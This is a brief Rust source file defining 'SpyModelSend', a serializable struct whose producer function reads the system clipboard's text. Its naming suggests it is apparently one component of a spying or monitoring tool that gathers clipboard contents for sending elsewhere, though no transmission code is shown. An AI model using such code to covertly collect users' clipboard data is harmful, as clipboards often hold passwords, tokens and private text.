use serde::{Serialize, Deserialize};
use super::producer::Producer;
use arboard::Clipboard;

#[derive(Debug, Serialize, Deserialize)]
pub struct SpyModelSend {
    clipboard: String
}

impl Producer for SpyModelSend {
    fn produce() -> Self {
        let mut clipboard = Clipboard::new().unwrap();
        let text = clipboard.get_text().unwrap();
        Self { clipboard: text }
        
    }
}

